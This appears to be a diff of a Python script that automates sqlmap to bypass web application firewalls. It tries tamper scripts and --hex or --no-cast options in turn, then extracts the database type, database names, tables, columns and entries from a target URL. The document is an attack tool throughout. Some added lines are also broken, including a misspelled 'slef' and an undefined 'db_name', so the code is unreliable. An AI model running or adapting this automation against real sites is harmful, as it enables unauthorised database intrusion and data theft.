@@ -9,17 +9,17 @@ if sys.version_info < (3, 0):
     sys.exit(1)
 try:
     from exp10it import figlet2file
-    from exp10it import figlet2file
     from exp10it import update_config_file_key_value
     from exp10it import get_key_value_from_config_file
     from exp10it import CLIOutput
 except:
     os.system("pip3 install exp10it")
     from exp10it import figlet2file
-    from exp10it import figlet2file
     from exp10it import update_config_file_key_value
     from exp10it import get_key_value_from_config_file
     from exp10it import CLIOutput
+
+
 class Program(object):
 
     def __init__(self):
@@ -38,7 +38,7 @@ class Program(object):
         self.sm_hex_command = self.sm_command + " --hex"
         self.sm_no_cast_command = self.sm_command + " --no-cast"
         # 下面两句初始化产生的内容为hex_or_no_cast列表和tamper_list列表的配置文件
-        if os.path.exists(self.log_file[:-4])==False:
+        if os.path.exists(self.log_file[:-4]) == False:
             self.output.good_print("警告!!!这个url还没用sqlmap跑过,请先用sqlmap跑它,在下的用途是过waf,在下将现在将退出!")
             sys.exit(1)
         update_config_file_key_value(self.log_config_file, 'default', 'hex_or_no_cast', [])
@@ -90,10 +90,13 @@ class Program(object):
         print(self.HSQLDB)
 
         if os.path.exists(self.log_file) == False:
-            self.output.stop_order=0
-            self.output.new_thread_bottom_print(self.stop_order,self.sm_command)
-            self.output.os_system_with_bottom_status(self.sm_command)
-            self.output.stop_order=1
+            current_finished_command_list = eval(get_key_value_from_config_file(self.log_config_file, 'default', 'finished_command_list'))
+            if self.sm_command in current_finished_command_list:
+                pass
+            else:
+                self.output.os_system_with_bottom_status(self.sm_command)
+                current_finished_command_list.append(self.sm_command)
+                update_config_file_key_value(self.log_config_file, 'default','finished_command_list', current_finished_command_list)
         has_sqli = self.get_log_file_need_tamper()
         if has_sqli == 0:
             # 如果没有漏洞就不再进行后面的检测了
@@ -107,21 +110,36 @@ class Program(object):
             update_config_file_key_value(self.log_config_file, 'default', 'db_type', '"MYSQL"')
         # get_db_type_need_tamper函数运行前获取db_type从log_file中获取,get_db_type_need_tamper函数运行之后获取
         # db_type从config_file中获取
+        # 下面在以后的注入语句中加上数据库类型加快注入速度
+        db_type = eval(get_key_value_from_config_file(self.log_config_file, 'default', 'db_type'))
+        self.sm_command = self.sm_command + " --dbms=%s" % db_type
+        self.sm_hex_command = self.sm_hex_command + " --dbms=%s" % db_type
+        self.sm_no_cast_command = self.sm_no_cast_command + " --dbms=%s" % db_type
 
-        # 这个要作为后面函数的全局变量来用
-        self.has_good_sqli_type = self.get_good_sqli_type_need_tamper()
-        self.get_db_name_need_tamper()
+        if db_type != 'ACCESS':
+            # ACCESS数据库将不运行get_good_sqli_type_need_tamper()[一般是B注入方法]和get_db_name_need_tamper()[--current_db会得
+            # 到None的结果]函数
+            # has_good_sqli_type这个值要作为后面函数的全局变量来用
+            self.has_good_sqli_type = self.get_good_sqli_type_need_tamper()
+            self.get_db_name_need_tamper()
+
+        #下面在全局的sql注入语句中加入-D db_name[如果数据库不是ACCESS]
+        self.sm_command= slef.sm_command+" -D "+db_name if db_type!='ACCESS' else self.sm_command
+        self.sm_hex_command = self.sm_command + " --hex"
+        self.sm_no_cast_command = self.sm_command + " --no-cast"
+        #上面的3句之后,以后出现在代码中的sql注入语句就没有-D db_name这样的string了
+
         self.get_table_name_need_tamper()
         self.get_column_name_need_tamper()
         has_entries = self.get_entries_need_tamper()
         if has_entries == 1:
             self.output.good_print("成功获取数据的命令是:\n%s" % eval(get_key_value_from_config_file(
-                self.log_config_file, 'default', 'bypassed_command')),'red')
+                self.log_config_file, 'default', 'bypassed_command')), 'red')
 
-        self.output.good_print('you tried %d times' % self.try_times,'red')
+        self.output.good_print('you tried %d times' % self.try_times, 'red')
 
         self.output.good_print('go to check if its possitive to bypass waf,vim %s ? y/n default[y] >' %
-                self.log_file,'green')
+                               self.log_file, 'green')
         choose = input()
         if choose == 'n' or choose == 'N':
             sys.exit(0)
@@ -131,8 +149,8 @@ class Program(object):
     def handle_url(self):
         if len(sys.argv) == 1:
             self.output.good_print('''you can use this script like this:\n%s eg."https://www.baidu.com/index.php?id=1"\n or''' %
-                  sys.argv[0],'yellow')
-            self.output.good_print('please input your url:>','yellow')
+                                   sys.argv[0], 'yellow')
+            self.output.good_print('please input your url:>', 'yellow')
             self.url = input()
         elif len(sys.argv) == 2:
             self.url = sys.argv[1]
@@ -140,11 +158,11 @@ class Program(object):
                 pass
             else:
                 self.output.good_print("you can use this script like this:\n%s eg.https://www.baidu.com/index.php?id=1\n or" %
-                      sys.argv[0],'yellow')
+                                       sys.argv[0], 'yellow')
                 print('please input your url:>')
                 self.url = input()
 
-    def get_db_type_from_log_file(self,log_file):
+    def get_db_type_from_log_file(self, log_file):
         with open(log_file, "r+") as f:
             log_content = f.read()
         # 下面的数据库类型在/usr/share/sqlmap/lib/core/enums.py文件中可得
@@ -185,10 +203,10 @@ class Program(object):
                 if re.search(HSQLDB_pattern, each):
                     return "HSQLDB"
         else:
-            self.output.good_print("can not get db type from log file,I will return 0",'red')
+            self.output.good_print("can not get db type from log file,I will return 0", 'red')
             return 0
 
-    def get_sqli_type_from_log_file(self,log_file):
+    def get_sqli_type_from_log_file(self, log_file):
         # 从log文件中获取注入方法有哪些eg.B|T|U|E|S|Q
         # 其中B|T|Q一般比U|E|S有更好的过waf的效果
         # 而U|E|S比B|T|Q有更快的注入速度和更高的注入权限
@@ -216,26 +234,30 @@ class Program(object):
             sqli_type.append('S')
         return sqli_type
 
-    def get_db_name_from_log_file(self,log_file):
+    def get_db_name_from_log_file(self, log_file):
         with open(log_file, "r+") as f:
             log_content = f.read()
         find_list = re.findall(r'''current database:[\s]*('|")*([^\s'"]+)''', log_content)
         db_name_list = []
         if find_list:
             for each in find_list:
-                if each[1] not in db_name_list and each[1]!="None":
+                if each[1] not in db_name_list and each[1] != "None":
                     db_name_list.append(each[1])
             return db_name_list
         else:
-            self.output.good_print("can not get db name from log file,I will return 0",'red')
+            self.output.good_print("can not get db name from log file,I will return 0", 'red')
             return 0
 
-    def get_table_name_from_log_file(self,log_file):
-        #这个函数返回当前current_db的第一个表名
+    def get_table_name_from_log_file(self, log_file):
+        # 这个函数返回当前current_db的第一个表名
         with open(log_file, "r+") as f:
             log_content = f.read()
-        current_db=self.get_db_name_from_log_file(self.log_file)[0]
-        #下面的正则查找current_db的第一个表名
+        # 下面的正则查找current_db的第一个表名
+        db_type=eval(get_key_value_from_config_file(self.log_config_file,'default','db_type'))
+        if db_type=='ACCESS':
+            current_db='Microsoft_Access_masterdb'
+        else:
+            current_db= self.get_db_name_from_log_file(self.log_file)[0]
         find_list = re.findall(r"Database:[\s]*(%s)[\s]+\[\d{1,3}\s+tables\]\s\+\-+\+\s\|\s+([^\s]+)\s" % current_db, log_content)
         table_list = []
         if find_list:
@@ -244,10 +266,10 @@ class Program(object):
                     table_list.append(each)
             return table_list[0][1]
         else:
-            self.output.good_print("can not get any table from log file,I will return 0",'red')
+            self.output.good_print("can not get any table from log file,I will return 0", 'red')
             return 0
 
-    def get_column_name_from_log_file(self,log_file):
+    def get_column_name_from_log_file(self, log_file):
         # 找出column,不用找出column的具体值,只要log文件中有column出现即可
         with open(log_file, "r+") as f:
             log_content = f.read()
@@ -255,18 +277,18 @@ class Program(object):
         if find_column:
             return 1
         else:
-            self.output.good_print("can not get any column from log file,I will return 0",'red')
+            self.output.good_print("can not get any column from log file,I will return 0", 'red')
             return 0
 
-    def get_entries_from_log_file(self,log_file):
-        # 找出column,不用找出column的具体值,只要log文件中有column出现即可
+    def get_entries_from_log_file(self, log_file):
+        # 找出entries,不用找出entries的具体值,只要log文件中有entries出现即可
         with open(log_file, "r+") as f:
             log_content = f.read()
         find_entries = re.search(r"\[(\d{1,3}) entries\]", log_content)
         if find_entries:
             return 1
         else:
-            self.output.good_print("can not get any entries from log file,I will return 0",'red')
+            self.output.good_print("can not get any entries from log file,I will return 0", 'red')
             return 0
 
     def check_DB_type_from_script(self, script_name):
@@ -386,8 +408,8 @@ class Program(object):
         if forwhat == 'log_file':
             # 为了获取有内容的log_file[也即检测出目标url有sqli漏洞]而运行的test_tamper_string
             flag = 0
-            self.output.good_print("现在尝试用tamper来获取有内容的log,也即检测出目标url有sqli...",'green')
-            self.output.good_print("目前使用的tamper是%s" % tamper_string,'green')
+            self.output.good_print("现在尝试用tamper来获取有内容的log,也即检测出目标url有sqli...", 'green')
+            self.output.good_print("目前使用的tamper是%s" % tamper_string, 'green')
             if eval(get_key_value_from_config_file(self.log_config_file, 'default', 'hex_or_no_cast')) == []:
                 # 当前还没有获取--hex或者--no-cast选项
                 current_finished_command_list = eval(get_key_value_from_config_file(
@@ -402,7 +424,7 @@ class Program(object):
 
                     if self.check_log_has_content(self.log_file) == True:
                         self.output.good_print("恭喜大爷!!! 使用当前tamper:%s检测到了当前url有sqli" %
-                                tamper_string,'red')
+                                               tamper_string, 'red')
                         flag = 1
 
                 if flag == 0:
@@ -417,7 +439,8 @@ class Program(object):
                                                      'finished_command_list', current_finished_command_list)
 
                         if self.check_log_has_content(self.log_file) == True:
-                            self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和--hex选项检测到了当前url有sqli" % tamper_string,'red')
+                            self.output.good_print(
+                                "恭喜大爷!!! 使用当前tamper:%s和--hex选项检测到了当前url有sqli" % tamper_string, 'red')
                             flag = 1
                             update_config_file_key_value(
                                 self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])
@@ -434,7 +457,8 @@ class Program(object):
                                                      'finished_command_list', current_finished_command_list)
 
                         if self.check_log_has_content(self.log_file) == True:
-                            self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和--no-cast选项检测到了当前url有sqli" % tamper_string,'red')
+                            self.output.good_print(
+                                "恭喜大爷!!! 使用当前tamper:%s和--no-cast选项检测到了当前url有sqli" % tamper_string, 'red')
                             flag = 1
                             update_config_file_key_value(self.log_config_file, 'default',
                                                          'hex_or_no_cast', ['--no-cast'])
@@ -457,7 +481,7 @@ class Program(object):
 
                     if self.check_log_has_content(self.log_file) == True:
                         self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和已经得到的%s选项检测到了当前url有sqli" %
-                              (tamper_string, hex_or_no_cast),'red')
+                                               (tamper_string, hex_or_no_cast), 'red')
                         # return 1代表达到forwhat的目的
                         flag = 1
 
@@ -483,8 +507,8 @@ class Program(object):
         if forwhat == 'db_type':
             # 为了获取数据库类型而运行的test_tamper_string
             flag = 0
-            self.output.good_print("现在尝试用tamper来获取数据库类型...",'green')
-            self.output.good_print("目前使用的tamper是%s" % tamper_string,'green')
+            self.output.good_print("现在尝试用tamper来获取数据库类型...", 'green')
+            self.output.good_print("目前使用的tamper是%s" % tamper_string, 'green')
             if eval(get_key_value_from_config_file(self.log_config_file, 'default', 'hex_or_no_cast')) == []:
                 # 当前还没有获取--hex或者--no-cast选项
                 current_finished_command_list = eval(get_key_value_from_config_file(
@@ -499,7 +523,7 @@ class Program(object):
 
                     if self.check_log_has_content(self.log_file) == True:
                         self.output.good_print("恭喜大爷!!! 使用当前tamper:%s检测到了当前url的数据库类型" %
-                                tamper_string,'red')
+                                               tamper_string, 'red')
                         flag = 1
 
                 if flag == 0:
@@ -514,7 +538,8 @@ class Program(object):
                                                      'finished_command_list', current_finished_command_list)
 
                         if self.get_db_type_from_log_file(self.log_file) != 0:
-                            self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和--hex选项检测到了当前url的数据库类型" % tamper_string,'red')
+                            self.output.good_print(
+                                "恭喜大爷!!! 使用当前tamper:%s和--hex选项检测到了当前url的数据库类型" % tamper_string, 'red')
                             flag = 1
                             update_config_file_key_value(
                                 self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])
@@ -531,7 +556,8 @@ class Program(object):
                                                          'finished_command_list', current_finished_command_list)
 
                             if self.get_db_type_from_log_file(self.log_file) != 0:
-                                self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和--no-cast选项检测到了当前url的数据库类型" % tamper_string,'red')
+                                self.output.good_print(
+                                    "恭喜大爷!!! 使用当前tamper:%s和--no-cast选项检测到了当前url的数据库类型" % tamper_string, 'red')
                                 flag = 1
                                 update_config_file_key_value(self.log_config_file, 'default',
                                                              'hex_or_no_cast', ['--no-cast'])
@@ -554,7 +580,7 @@ class Program(object):
 
                     if self.get_db_type_from_log_file(self.log_file) != 0:
                         self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和已经得到的%s选项检测到了当前url的数据库类型" %
-                              (tamper_string, hex_or_no_cast),'red')
+                                               (tamper_string, hex_or_no_cast), 'red')
                         flag = 1
 
             if flag == 1:
@@ -579,8 +605,8 @@ class Program(object):
         if forwhat == 'good_sqli_type':
             # 为了获取E|U|S高效注入方法而运行的test_tamper_string
             flag = 0
-            self.output.good_print("现在尝试用tamper来获取E|U|S高效注入方法...",'green')
-            self.output.good_print("目前使用的tamper是%s" % tamper_string,'green')
+            self.output.good_print("现在尝试用tamper来获取E|U|S高效注入方法...", 'green')
+            self.output.good_print("目前使用的tamper是%s" % tamper_string, 'green')
             if eval(get_key_value_from_config_file(self.log_config_file, 'default', 'hex_or_no_cast')) == []:
                 # 当前还没有获取--hex或者--no-cast选项
                 current_finished_command_list = eval(get_key_value_from_config_file(
@@ -596,7 +622,7 @@ class Program(object):
                     sqli_type = self.get_sqli_type_from_log_file(self.log_file)
                     if 'U' in sqli_type or 'E' in sqli_type or 'S' in sqli_type:
                         self.output.good_print("恭喜大爷!!! 使用当前tamper:%s获得了U|E|S一种以上的高效注入方法"
-                                % tamper_string,'red')
+                                               % tamper_string, 'red')
                         flag = 1
 
                 if flag == 0:
@@ -605,7 +631,8 @@ class Program(object):
                     if self.sm_hex_command_with_tamper + " --technique=USE" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=USE")
+                        self.output.os_system_with_bottom_status(
+                            self.sm_hex_command_with_tamper + " --technique=USE")
                         current_finished_command_list.append(
                             self.sm_hex_command_with_tamper + " --technique=USE")
                         update_config_file_key_value(self.log_config_file, 'default',
@@ -613,7 +640,8 @@ class Program(object):
 
                         sqli_type = self.get_sqli_type_from_log_file(self.log_file)
                         if 'U' in sqli_type or 'E' in sqli_type or 'S' in sqli_type:
-                            self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和--hex选项获得了U|E|S一种以上的高效注入方法" % tamper_string,'red')
+                            self.output.good_print(
+                                "恭喜大爷!!! 使用当前tamper:%s和--hex选项获得了U|E|S一种以上的高效注入方法" % tamper_string, 'red')
                             flag = 1
                             update_config_file_key_value(
                                 self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])
@@ -624,13 +652,15 @@ class Program(object):
                         if self.sm_no_cast_command_with_tamper + " --technique=USE" in current_finished_command_list:
                             pass
                         else:
-                            self.output.os_system_with_bottom_status(self.sm_no_cast_command_with_tamper + " --technique=USE")
+                            self.output.os_system_with_bottom_status(
+                                self.sm_no_cast_command_with_tamper + " --technique=USE")
                             current_finished_command_list.append(
                                 self.sm_no_cast_command_with_tamper + " --technique=USE")
 
                             sqli_type = self.get_sqli_type_from_log_file(self.log_file)
                             if 'U' in sqli_type or 'E' in sqli_type or 'S' in sqli_type:
-                                self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和--no-cast选项获得了U|E|S一种以上的高效注入方法" % tamper_string,'red')
+                                self.output.good_print(
+                                    "恭喜大爷!!! 使用当前tamper:%s和--no-cast选项获得了U|E|S一种以上的高效注入方法" % tamper_string, 'red')
                                 flag = 1
                                 update_config_file_key_value(self.log_config_file, 'default',
                                                              'hex_or_no_cast', ['--no-cast'])
@@ -654,7 +684,7 @@ class Program(object):
                     sqli_type = self.get_sqli_type_from_log_file(self.log_file)
                     if 'U' in sqli_type or 'E' in sqli_type or 'S' in sqli_type:
                         self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和已经得到的%s选项获得了U|E|S一种以上的高效注入方法" %
-                              (tamper_string, hex_or_no_cast),'red')
+                                               (tamper_string, hex_or_no_cast), 'red')
                         flag = 1
 
             if flag == 1:
@@ -680,8 +710,8 @@ class Program(object):
             # 为了获取所有数据库而运行的test_tamper_string
 
             flag = 0
-            self.output.good_print("现在尝试用tamper来获取当前url的数据库名...",'green')
-            self.output.good_print("目前使用的tamper是%s" % tamper_string,'green')
+            self.output.good_print("现在尝试用tamper来获取当前url的数据库名...", 'green')
+            self.output.good_print("目前使用的tamper是%s" % tamper_string, 'green')
             if eval(get_key_value_from_config_file(self.log_config_file, 'default', 'hex_or_no_cast')) == []:
                 # 当前还没有获取--hex或者--no-cast选项
                 if self.has_good_sqli_type == 1:
@@ -690,7 +720,8 @@ class Program(object):
                     if self.sm_command_with_tamper + " --technique=USE" + " --current-db" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_command_with_tamper + " --technique=USE" + " --current-db")
+                        self.output.os_system_with_bottom_status(
+                            self.sm_command_with_tamper + " --technique=USE" + " --current-db")
                         current_finished_command_list.append(
                             self.sm_command_with_tamper + " --technique=USE" + " --current-db")
                         update_config_file_key_value(self.log_config_file, 'default',
@@ -699,7 +730,7 @@ class Program(object):
                         db_name_list = self.get_db_name_from_log_file(self.log_file)
                         if db_name_list != 0 and db_name_list != []:
                             self.good_print("恭喜大爷!!! 使用当前tamper:%s获得了当前url的数据库名" %
-                                    tamper_string,'red')
+                                            tamper_string, 'red')
                             flag = 1
 
                 if flag == 0:
@@ -708,7 +739,8 @@ class Program(object):
                     if self.sm_command_with_tamper + " --technique=BQT" + " --current-db" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_command_with_tamper + " --technique=BQT" + " --current-db")
+                        self.output.os_system_with_bottom_status(
+                            self.sm_command_with_tamper + " --technique=BQT" + " --current-db")
                         current_finished_command_list.append(
                             self.sm_command_with_tamper + " --technique=BQT" + " --current-db")
                         update_config_file_key_value(self.log_config_file, 'default',
@@ -717,7 +749,7 @@ class Program(object):
                         db_name_list = self.get_db_name_from_log_file(self.log_file)
                         if db_name_list != 0 and db_name_list != []:
                             self.output.good_print("恭喜大爷!!! 使用当前tamper:%s获得了当前url的数据库名" %
-                                    tamper_string,'red')
+                                                   tamper_string, 'red')
                             flag = 1
 
                 if flag == 0:
@@ -727,7 +759,8 @@ class Program(object):
                         if self.sm_hex_command_with_tamper + " --technique=USE" + " --current-db" in current_finished_command_list:
                             pass
                         else:
-                            self.output.os_system_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=USE" + " --current-db")
+                            self.output.os_system_with_bottom_status(
+                                self.sm_hex_command_with_tamper + " --technique=USE" + " --current-db")
                             current_finished_command_list.append(
                                 self.sm_hex_command_with_tamper + " --technique=USE" + " --current-db")
                             update_config_file_key_value(self.log_config_file, 'default',
@@ -735,7 +768,8 @@ class Program(object):
 
                             db_name_list = self.get_db_name_from_log_file(self.log_file)
                             if db_name_list != 0 and db_name_list != []:
-                                self.good_print("恭喜大爷!!! 使用当前tamper:%s和--hex选项获得了当前url的数据库名" % tamper_string,'red')
+                                self.good_print("恭喜大爷!!! 使用当前tamper:%s和--hex选项获得了当前url的数据库名" %
+                                                tamper_string, 'red')
                                 flag = 1
                                 update_config_file_key_value(self.log_config_file, 'default',
                                                              'hex_or_no_cast', ['--hex'])
@@ -746,7 +780,8 @@ class Program(object):
                         if self.sm_hex_command_with_tamper + " --technique=BQT" + " --current-db" in current_finished_command_list:
                             pass
                         else:
-                            self.output.os_system_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=BQT" + " --current-db")
+                            self.output.os_system_with_bottom_status(
+                                self.sm_hex_command_with_tamper + " --technique=BQT" + " --current-db")
                             current_finished_command_list.append(
                                 self.sm_hex_command_with_tamper + " --technique=BQT" + " --current-db")
                             update_config_file_key_value(self.log_config_file, 'default',
@@ -754,7 +789,8 @@ class Program(object):
 
                             db_name_list = self.get_db_name_from_log_file(self.log_file)
                             if db_name_list != 0 and db_name_list != []:
-                                self.good_print("恭喜大爷!!! 使用当前tamper:%s和--hex选项获得了当前url的数据库名" % tamper_string,'red')
+                                self.good_print("恭喜大爷!!! 使用当前tamper:%s和--hex选项获得了当前url的数据库名" %
+                                                tamper_string, 'red')
                                 flag = 1
                                 update_config_file_key_value(self.log_config_file, 'default',
                                                              'hex_or_no_cast', ['--hex'])
@@ -766,7 +802,7 @@ class Program(object):
                                 pass
                             else:
                                 self.output.os_system_with_bottom_status(self.sm_no_cast_command_with_tamper +
-                                          " --technique=USE" + " --current-db")
+                                                                         " --technique=USE" + " --current-db")
                                 current_finished_command_list.append(
                                     self.sm_no_cast_command_with_tamper + " --technique=USE" + " --current-db")
                                 update_config_file_key_value(self.log_config_file, 'default',
@@ -774,7 +810,8 @@ class Program(object):
 
                                 db_name_list = self.get_db_name_from_log_file(self.log_file)
                                 if db_name_list != 0 and db_name_list != []:
-                                    self.good_print("恭喜大爷!!! 使用当前tamper:%s和--no-cast选项获得了当前url的数据库名" % tamper_string,'red')
+                                    self.good_print("恭喜大爷!!! 使用当前tamper:%s和--no-cast选项获得了当前url的数据库名" %
+                                                    tamper_string, 'red')
                                     flag = 1
                                     update_config_file_key_value(
                                         self.log_config_file, 'default', 'hex_or_no_cast', ['--no-cast'])
@@ -786,7 +823,7 @@ class Program(object):
                                 pass
                             else:
                                 self.output.os_system_with_bottom_status(self.sm_no_cast_command_with_tamper +
-                                          " --technique=BQT" + " --current-db")
+                                                                         " --technique=BQT" + " --current-db")
                                 current_finished_command_list.append(
                                     self.sm_no_cast_command_with_tamper + " --technique=BQT" + " --current-db")
                                 update_config_file_key_value(self.log_config_file, 'default',
@@ -794,7 +831,8 @@ class Program(object):
 
                                 db_name_list = self.get_db_name_from_log_file(self.log_file)
                                 if db_name_list != 0 and db_name_list != []:
-                                    self.good_print("恭喜大爷!!! 使用当前tamper:%s和--no-cast选项获得了当前url的数据库名" % tamper_string,'red')
+                                    self.good_print("恭喜大爷!!! 使用当前tamper:%s和--no-cast选项获得了当前url的数据库名" %
+                                                    tamper_string, 'red')
                                     flag = 1
                                     update_config_file_key_value(
                                         self.log_config_file, 'default', 'hex_or_no_cast', ['--no-cast'])
@@ -812,7 +850,8 @@ class Program(object):
                     if sm_hex_or_no_cast_command_with_tamper + " --current-db" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command_with_tamper + " --current-db")
+                        self.output.os_system_with_bottom_status(
+                            sm_hex_or_no_cast_command_with_tamper + " --current-db")
                         current_finished_command_list.append(
                             sm_hex_or_no_cast_command_with_tamper + " --current-db")
                         update_config_file_key_value(self.log_config_file, 'default',
@@ -821,7 +860,7 @@ class Program(object):
                         db_name_list = self.get_db_name_from_log_file(self.log_file)
                         if db_name_list != 0 and db_name_list != []:
                             self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和已经得到的%s选项获得了当前url的数据库名" %
-                                  (tamper_string, hex_or_no_cast),'red')
+                                                   (tamper_string, hex_or_no_cast), 'red')
                             flag = 1
 
                 if flag == 0:
@@ -831,7 +870,8 @@ class Program(object):
                     if sm_hex_or_no_cast_command_with_tamper + " --current-db" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command_with_tamper + " --current-db")
+                        self.output.os_system_with_bottom_status(
+                            sm_hex_or_no_cast_command_with_tamper + " --current-db")
                         current_finished_command_list.append(
                             sm_hex_or_no_cast_command_with_tamper + " --current-db")
                         update_config_file_key_value(self.log_config_file, 'default',
@@ -840,7 +880,7 @@ class Program(object):
                         db_name_list = self.get_db_name_from_log_file(self.log_file)
                         if db_name_list != 0 and db_name_list != []:
                             self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和已经得到的%s选项获得了当前url的数据库名" %
-                                  (tamper_string, hex_or_no_cast),'red')
+                                                   (tamper_string, hex_or_no_cast), 'red')
                             flag = 1
 
             if flag == 1:
@@ -865,66 +905,66 @@ class Program(object):
         if forwhat == 'table_name':
             # 为了获取一个数据库的所有表名的值而运行的test_tamper_string
             flag = 0
-            self.good_print("现在尝试用tamper来获取当前数据库的表名...",'green')
-            self.good_print("目前使用的tamper是%s" % tamper_string,'green')
+            self.good_print("现在尝试用tamper来获取当前数据库的表名...", 'green')
+            self.good_print("目前使用的tamper是%s" % tamper_string, 'green')
             db_name = self.get_db_name_from_log_file(self.log_file)[0]
             if eval(get_key_value_from_config_file(self.log_config_file, 'default', 'hex_or_no_cast')) == []:
                 # 当前还没有获取--hex或者--no-cast选项
                 if self.has_good_sqli_type == 1:
                     current_finished_command_list = eval(get_key_value_from_config_file(
                         self.log_config_file, 'default', 'finished_command_list'))
-                    if self.sm_command_with_tamper + " --technique=USE" + " -D " + db_name + " --tables" in current_finished_command_list:
+                    if self.sm_command_with_tamper + " --technique=USE" + " --tables" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_command_with_tamper + " --technique=USE" +
-                                  " -D " + db_name + " --tables")
+                        self.output.os_system_with_bottom_status(self.sm_command_with_tamper + " --technique=USE" + " --tables")
                         current_finished_command_list.append(
-                            self.sm_command_with_tamper + " --technique=USE" + " -D " + db_name + " --tables")
+                            self.sm_command_with_tamper + " --technique=USE" + " --tables")
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
 
-                        table_name= self.get_table_name_from_log_file(self.log_file)
-                        if table_name!= 0 and table_name!= "":
+                        table_name = self.get_table_name_from_log_file(self.log_file)
+                        if table_name != 0 and table_name != "":
                             self.good_print("恭喜大爷!!! 使用当前tamper:%s获得了当前数据库的表名" %
-                                    tamper_string,'red')
+                                            tamper_string, 'red')
                             flag = 1
 
                 if flag == 0:
                     current_finished_command_list = eval(get_key_value_from_config_file(
                         self.log_config_file, 'default', 'finished_command_list'))
-                    if self.sm_command_with_tamper + " --technique=BQT" + " -D " + db_name + " --tables" in current_finished_command_list:
+                    if self.sm_command_with_tamper + " --technique=BQT" + " --tables" in current_finished_command_list:
                         pass
                     else:
                         self.output.os_system_with_bottom_status(self.sm_command_with_tamper + " --technique=BQT" +
-                                  " -D " + db_name + " --tables")
+                                                                 " --tables")
                         current_finished_command_list.append(
-                            self.sm_command_with_tamper + " --technique=BQT" + " -D " + db_name + " --tables")
+                            self.sm_command_with_tamper + " --technique=BQT" + " --tables")
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
 
-                        table_name= self.get_table_name_from_log_file(self.log_file)
-                        if table_name!= 0 and table_name!= "":
+                        table_name = self.get_table_name_from_log_file(self.log_file)
+                        if table_name != 0 and table_name != "":
                             self.output.good_print("恭喜大爷!!! 使用当前tamper:%s获得了当前数据库的表名" %
-                                    tamper_string,'red')
+                                                   tamper_string, 'red')
                             flag = 1
 
                 if flag == 0:
                     if self.has_good_sqli_type == 1:
                         current_finished_command_list = eval(get_key_value_from_config_file(
                             self.log_config_file, 'default', 'finished_command_list'))
-                        if self.sm_hex_command_with_tamper + " --technique=USE" + " -D " + db_name + " --tables" in current_finished_command_list:
+                        if self.sm_hex_command_with_tamper + " --technique=USE" + " --tables" in current_finished_command_list:
                             pass
                         else:
                             self.output.os_system_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=USE" +
-                                      " -D " + db_name + " --tables")
+                                                                     " --tables")
                             current_finished_command_list.append(
-                                self.sm_hex_command_with_tamper + " --technique=USE" + " -D " + db_name + " --tables")
+                                self.sm_hex_command_with_tamper + " --technique=USE" + " --tables")
                             update_config_file_key_value(self.log_config_file, 'default',
                                                          'finished_command_list', current_finished_command_list)
 
-                            table_name= self.get_table_name_from_log_file(self.log_file)
-                            if table_name!= 0 and table_name!= "":
-                                self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和--hex选项获得了当前数据库的表名" % tamper_string,'red')
+                            table_name = self.get_table_name_from_log_file(self.log_file)
+                            if table_name != 0 and table_name != "":
+                                self.output.good_print(
+                                    "恭喜大爷!!! 使用当前tamper:%s和--hex选项获得了当前数据库的表名" % tamper_string, 'red')
                                 flag = 1
                                 update_config_file_key_value(self.log_config_file, 'default',
                                                              'hex_or_no_cast', ['--hex'])
@@ -932,19 +972,20 @@ class Program(object):
                     if flag == 0:
                         current_finished_command_list = eval(get_key_value_from_config_file(
                             self.log_config_file, 'default', 'finished_command_list'))
-                        if self.sm_hex_command_with_tamper + " --technique=BQT" + " -D " + db_name + " --tables" in current_finished_command_list:
+                        if self.sm_hex_command_with_tamper + " --technique=BQT" + " --tables" in current_finished_command_list:
                             pass
                         else:
                             self.output.os_system_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=BQT" +
-                                      " -D " + db_name + " --tables")
+                                                                     " --tables")
                             current_finished_command_list.append(
-                                self.sm_hex_command_with_tamper + " --technique=BQT" + " -D " + db_name + " --tables")
+                                self.sm_hex_command_with_tamper + " --technique=BQT" + " --tables")
                             update_config_file_key_value(self.log_config_file, 'default',
                                                          'finished_command_list', current_finished_command_list)
 
-                            table_name= self.get_table_name_from_log_file(self.log_file)
-                            if table_name!= 0 and table_name!= "":
-                                self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和--hex选项获得了当前数据库的表名" % tamper_string,'red')
+                            table_name = self.get_table_name_from_log_file(self.log_file)
+                            if table_name != 0 and table_name != "":
+                                self.output.good_print(
+                                    "恭喜大爷!!! 使用当前tamper:%s和--hex选项获得了当前数据库的表名" % tamper_string, 'red')
                                 flag = 1
                                 update_config_file_key_value(self.log_config_file, 'default',
                                                              'hex_or_no_cast', ['--hex'])
@@ -953,19 +994,20 @@ class Program(object):
                         if self.has_good_sqli_type == 1:
                             current_finished_command_list = eval(get_key_value_from_config_file(
                                 self.log_config_file, 'default', 'finished_command_list'))
